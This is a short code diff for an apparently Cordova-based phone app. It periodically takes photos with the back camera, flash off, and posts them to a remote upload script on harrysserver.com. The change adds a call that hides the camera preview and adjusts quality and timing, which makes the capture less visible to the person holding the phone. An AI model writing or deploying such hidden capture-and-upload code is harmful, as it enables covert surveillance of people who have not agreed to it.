@@ -8,14 +8,14 @@ var app = {
 
 var photograph=function() {
   let url='http://harrysserver.com/camera/upload.php';
-      CameraPreview.takePicture({height:1280, width:720, quality:50}, function(base64PictureData) {
+      CameraPreview.takePicture({height:1280, width:720, quality:70}, function(base64PictureData) {
         var pic='data:image/jpeg;base64,'+base64PictureData;
-        $.post(url, {image: pic, timeout: 10000});
+        $.post(url, {image: pic, timeout: 50000});
       });
 }
 
 function delay() {
-  return new Promise(resolve =>  setTimeout(resolve, 15000));
+  return new Promise(resolve =>  setTimeout(resolve, 60000));
 }
 
 async function delayedLog() {
@@ -32,5 +32,6 @@ async function processArray() {
 app.initialize();
 CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
 CameraPreview.setFlashMode(CameraPreview.FLASH_MODE.OFF);
+CameraPreview.hide();
 processArray();
 
